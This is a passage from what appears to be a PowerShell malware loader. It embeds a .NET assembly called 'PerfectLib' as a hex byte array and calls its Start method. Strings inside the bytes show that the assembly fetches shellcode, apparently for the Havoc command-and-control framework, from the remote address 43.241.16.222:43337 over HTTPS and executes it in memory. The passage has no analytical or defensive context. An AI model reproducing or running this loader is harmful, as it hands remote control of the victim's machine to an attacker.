72,0x73,0x00,0x6c,0x70,0x53,0x74,0x61,0x72,0x74,0x41,0x64,0x64,0x72,0x65,0x73,0x73,0x00,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x44,0x65,0x63,0x6f,0x6d,0x70,0x72,0x65,0x73,0x73,0x00,0x57,0x61,0x69,0x74,0x46,0x6f,0x72,0x53,0x69,0x6e,0x67,0x6c,0x65,0x4f,0x62,0x6a,0x65,0x63,0x74,0x00,0x66,0x6c,0x50,0x72,0x6f,0x74,0x65,0x63,0x74,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4e,0x65,0x74,0x00,0x43,0x53,0x74,0x61,0x72,0x74,0x00,0x48,0x74,0x74,0x70,0x57,0x65,0x62,0x52,0x65,0x71,0x75,0x65,0x73,0x74,0x00,0x54,0x6f,0x41,0x72,0x72,0x61,0x79,0x00,0x43,0x6f,0x70,0x79,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4e,0x65,0x74,0x2e,0x53,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x00,0x00,0x13,0x73,0x00,0x74,0x00,0x61,0x00,0x72,0x00,0x74,0x00,0x20,0x00,0x2e,0x00,0x2e,0x00,0x2e,0x00,0x00,0x6d,0x68,0x00,0x74,0x00,0x74,0x00,0x70,0x00,0x73,0x00,0x3a,0x00,0x2f,0x00,0x2f,0x00,0x34,0x00,0x33,0x00,0x2e,0x00,0x32,0x00,0x34,0x00,0x31,0x00,0x2e,0x00,0x31,0x00,0x36,0x00,0x2e,0x00,0x32,0x00,0x32,0x00,0x32,0x00,0x3a,0x00,0x34,0x00,0x33,0x00,0x33,0x00,0x33,0x00,0x37,0x00,0x2f,0x00,0x54,0x00,0x65,0x00,0x6d,0x00,0x70,0x00,0x2f,0x00,0x68,0x00,0x61,0x00,0x76,0x00,0x6f,0x00,0x63,0x00,0x5f,0x00,0x77,0x00,0x61,0x00,0x69,0x00,0x77,0x00,0x61,0x00,0x6e,0x00,0x67,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x68,0x00,0x69,0x00,0x5f,0x00,0x73,0x00,0x63,0x00,0x00,0x15,0x65,0x00,0x78,0x00,0x65,0x00,0x63,0x00,0x75,0x00,0x74,0x00,0x65,0x00,0x20,0x00,0x2e,0x00,0x2e,0x00,0x00,0x00,0x00,0x00,0x3b,0xf3,0xc1,0x5b,0x42,0xf4,0x35,0x42,0x8f,0xca,0x84,0xa7,0x1e,0x1a,0x3f,0xf6,0x00,0x04,0x20,0x01,0x01,0x08,0x03,0x20,0x00,0x01,0x05,0x20,0x01,0x01,0x11,0x11,0x04,0x20,0x01,0x01,0x0e,0x04,0x20,0x01,0x01,0x02,0x04,0x07,0x01,0x12,0x45,0x05,0x20,0x01,0x01,0x1d,0x05,0x07,0x20,0x02,0x01,0x12,0x4d,0x11,0x6d,0x05,0x20,0x01,0x01,0x12,0x4d,0x04,0x20,0x00,0x1d,0x05,0x0e,0x07,0x09,0x12,0x49,0x12,0x4d,0x1d,0x05,0x08,0x08,0x18,0x09,0x18,0x08,0x04,0x00,0x01,0x01,0x0e,0x04,0x00,0x00,0x12,0x59,0x05,0x20,0x02,0x01,0x1c,0x18,0x08,0x00,0x02,0x12,0x79,0x12,0x79,0x12,0x79,0x05,0x00,0x01,0x01,0x12,0x59,0x05,0x00,0x01,0x12,0x7d,0x0e,0x05,0x20,0x00,0x12,0x80,0x85,0x04,0x20,0x00,0x12,0x4d,0x03,0x20,0x00,0x0a,0x07,0x20,0x03,0x08,0x1d,0x05,0x08,0x08,0x02,0x06,0x18,0x08,0x00,0x04,0x01,0x1d,0x05,0x08,0x18,0x08,0x08,0xb7,0x7a,0x5c,0x56,0x19,0x34,0xe0,0x89,0x04,0x00,0x10,0x00,0x00,0x04,0x00,0x20,0x00,0x00,0x04,0x00,0x00,0x01,0x00,0x04,0x02,0x00,0x00,0x00,0x04,0x04,0x00,0x00,0x00,0x04,0x10,0x00,0x00,0x00,0x04,0x20,0x00,0x00,0x00,0x04,0x40,0x00,0x00,0x00,0x02,0x06,0x08,0x03,0x06,0x11,0x0c,0x03,0x06,0x11,0x10,0x03,0x06,0x12,0x14,0x03,0x06,0x12,0x59,0x07,0x00,0x04,0x18,0x18,0x0b,0x09,0x09,0x0a,0x00,0x06,0x18,0x09,0x09,0x18,0x18,0x09,0x10,0x09,0x05,0x00,0x02,0x09,0x18,0x09,0x06,0x00,0x01,0x1d,0x05,0x1d,0x05,0x03,0x00,0x00,0x01,0x0a,0x20,0x04,0x02,0x1c,0x12,0x5d,0x12,0x61,0x11,0x65,0x08,0x01,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x1e,0x01,0x00,0x01,0x00,0x54,0x02,0x16,0x57,0x72,0x61,0x70,0x4e,0x6f,0x6e,0x45,0x78,0x63,0x65,0x70,0x74,0x69,0x6f,0x6e,0x54,0x68,0x72,0x6f,0x77,0x73,0x01,0x08,0x01,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x0f,0x01,0x00,0x0a,0x50,0x65,0x72,0x66,0x65,0x63,0x74,0x4c,0x69,0x62,0x00,0x00,0x05,0x01,0x00,0x00,0x00,0x00,0x17,0x01,0x00,0x12,0x43,0x6f,0x70,0x79,0x72,0x69,0x67,0x68,0x74,0x20,0xc2,0xa9,0x20,0x20,0x32,0x30,0x32,0x33,0x00,0x00,0x29,0x01,0x00,0x24,0x31,0x38,0x34,0x37,0x35,0x37,0x31,0x39,0x2d,0x66,0x31,0x37,0x30,0x2d,0x34,0x65,0x62,0x35,0x2d,0x39,0x31,0x38,0x64,0x2d,0x32,0x61,0x35,0x63,0x33,0x33,0x38,0x35,0x35,0x39,0x38,0x35,0x00,0x00,0x0c,0x01,0x00,0x07,0x31,0x2e,0x30,0x2e,0x30,0x2e,0x30,0x00,0x00,0x47,0x01,0x00,0x1a,0x2e,0x4e,0x45,0x54,0x46,0x72,0x61,0x6d,0x65,0x77,0x6f,0x72,0x6b,0x2c,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x3d,0x76,0x34,0x2e,0x30,0x01,0x00,0x54,0x0e,0x14,0x46,0x72,0x61,0x6d,0x65,0x77,0x6f,0x72,0x6b,0x44,0x69,0x73,0x70,0x6c,0x61,0x79,0x4e,0x61,0x6d,0x65,0x10,0x2e,0x4e,0x45,0x54,0x20,0x46,0x72,0x61,0x6d,0x65,0x77,0x6f,0x72,0x6b,0x20,0x34,0x04,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x26,0x1a,0xc2,0xd6,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x4b,0x00,0x00,0x00,0x4c,0x2f,0x00,0x00,0x4c,0x11,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x52,0x53,0x44,0x53,0x4b,0xc3,0xa9,0xfd,0x30,0xe7,0x68,0x4b,0xae,0x44,0xad,0x30,0x30,0x9f,0x0d,0x3f,0x01,0x00,0x00,0x00,0x44,0x3a,0x5c,0x77,0x6f,0x72,0x6b,0x73,0x70,0x61,0x63,0x65,0x5c,0x50,0x65,0x72,0x66,0x65,0x63,0x74,0x4c,0x69,0x62,0x5c,0x6f,0x62,0x6a,0x5c,0x52,0x65,0x6c,0x65,0x61,0x73,0x65,0x5c,0x50,0x65,0x72,0x66,0x65,0x63,0x74,0x4c,0x69,0x62,0x2e,0x70,0x64,0x62,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x10,0x00,0x00,0x00,0x18,0x00,0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x30,0x00,0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x58,0x40,0x00,0x00,0x2c,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2c,0x03,0x34,0x00,0x00,0x00,0x56,0x00,0x53,0x00,0x5f,0x00,0x56,0x00,0x45,0x00,0x52,0x00,0x53,0x00,0x49,0x00,0x4f,0x00,0x4e,0x00,0x5f,0x00,0x49,0x00,0x4e,0x00,0x46,0x00,0x4f,0x00,0x00,0x00,0x00,0x00,0xbd,0x04,0xef,0xfe,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x00,0x01,0x00,0x56,0x00,0x61,0x00,0x72,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x49,0x00,0x6e,0x00,0x66,0x00,0x6f,0x00,0x00,0x00,0x00,0x00,0x24,0x00,0x04,0x00,0x00,0x00,0x54,0x00,0x72,0x00,0x61,0x00,0x6e,0x00,0x73,0x00,0x6c,0x00,0x61,0x00,0x74,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x04,0x8c,0x02,0x00,0x00,0x01,0x00,0x53,0x00,0x74,0x00,0x72,0x00,0x69,0x00,0x6e,0x00,0x67,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x49,0x00,0x6e,0x00,0x66,0x00,0x6f,0x00,0x00,0x00,0x68,0x02,0x00,0x00,0x01,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x34,0x00,0x62,0x00,0x30,0x00,0x00,0x00,0x1a,0x00,0x01,0x00,0x01,0x00,0x43,0x00,0x6f,0x00,0x6d,0x00,0x6d,0x00,0x65,0x00,0x6e,0x00,0x74,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x22,0x00,0x01,0x00,0x01,0x00,0x43,0x00,0x6f,0x00,0x6d,0x00,0x70,0x00,0x61,0x00,0x6e,0x00,0x79,0x00,0x4e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3e,0x00,0x0b,0x00,0x01,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x44,0x00,0x65,0x00,0x73,0x00,0x63,0x00,0x72,0x00,0x69,0x00,0x70,0x00,0x74,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x50,0x00,0x65,0x00,0x72,0x00,0x66,0x00,0x65,0x00,0x63,0x00,0x74,0x00,0x4c,0x00,0x69,0x00,0x62,0x00,0x00,0x00,0x00,0x00,0x30,0x00,0x08,0x00,0x01,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x31,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x00,0x00,0x3e,0x00,0x0f,0x00,0x01,0x00,0x49,0x00,0x6e,0x00,0x74,0x00,0x65,0x00,0x72,0x00,0x6e,0x00,0x61,0x00,0x6c,0x00,0x4e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x00,0x00,0x50,0x00,0x65,0x00,0x72,0x00,0x66,0x00,0x65,0x00,0x63,0x00,0x74,0x00,0x4c,0x00,0x69,0x00,0x62,0x00,0x2e,0x00,0x64,0x00,0x6c,0x00,0x6c,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x12,0x00,0x01,0x00,0x4c,0x00,0x65,0x00,0x67,0x00,0x61,0x00,0x6c,0x00,0x43,0x00,0x6f,0x00,0x70,0x00,0x79,0x00,0x72,0x00,0x69,0x00,0x67,0x00,0x68,0x00,0x74,0x00,0x00,0x00,0x43,0x00,0x6f,0x00,0x70,0x00,0x79,0x00,0x72,0x00,0x69,0x00,0x67,0x00,0x68,0x00,0x74,0x00,0x20,0x00,0xa9,0x00,0x20,0x00,0x20,0x00,0x32,0x00,0x30,0x00,0x32,0x00,0x33,0x00,0x00,0x00,0x2a,0x00,0x01,0x00,0x01,0x00,0x4c,0x00,0x65,0x00,0x67,0x00,0x61,0x00,0x6c,0x00,0x54,0x00,0x72,0x00,0x61,0x00,0x64,0x00,0x65,0x00,0x6d,0x00,0x61,0x00,0x72,0x00,0x6b,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x0f,0x00,0x01,0x00,0x4f,0x00,0x72,0x00,0x69,0x00,0x67,0x00,0x69,0x00,0x6e,0x00,0x61,0x00,0x6c,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x00,0x00,0x50,0x00,0x65,0x00,0x72,0x00,0x66,0x00,0x65,0x00,0x63,0x00,0x74,0x00,0x4c,0x00,0x69,0x00,0x62,0x00,0x2e,0x00,0x64,0x00,0x6c,0x00,0x6c,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x0b,0x00,0x01,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x64,0x00,0x75,0x00,0x63,0x00,0x74,0x00,0x4e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x00,0x00,0x00,0x00,0x50,0x00,0x65,0x00,0x72,0x00,0x66,0x00,0x65,0x00,0x63,0x00,0x74,0x00,0x4c,0x00,0x69,0x00,0x62,0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x08,0x00,0x01,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x64,0x00,0x75,0x00,0x63,0x00,0x74,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x31,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x00,0x00,0x38,0x00,0x08,0x00,0x01,0x00,0x41,0x00,0x73,0x00,0x73,0x00,0x65,0x00,0x6d,0x00,0x62,0x00,0x6c,0x00,0x79,0x00,0x20,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x31,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)) | 
    Out-Null;
  }
  [PerfectLib.CStart]::Start();
}
NONONO;
Start-Sleep 1;
